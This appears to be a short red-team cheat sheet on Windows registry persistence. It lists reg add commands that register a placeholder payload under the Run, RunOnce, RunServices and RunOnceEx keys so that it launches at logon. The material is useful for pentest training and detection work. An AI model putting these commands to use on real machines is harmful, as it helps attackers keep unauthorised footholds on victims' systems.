# Registry

Terminal

```
# 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"

#
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
```

\--------------------------------------------------------------------------

Oddvar Moe discovered two more registry locations that could allow red teams to achieve persistence by executing either an arbitrary payload or a DLL. These will be executed during logon and require admin level privileges.

```
// Some codereg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.dll"
```

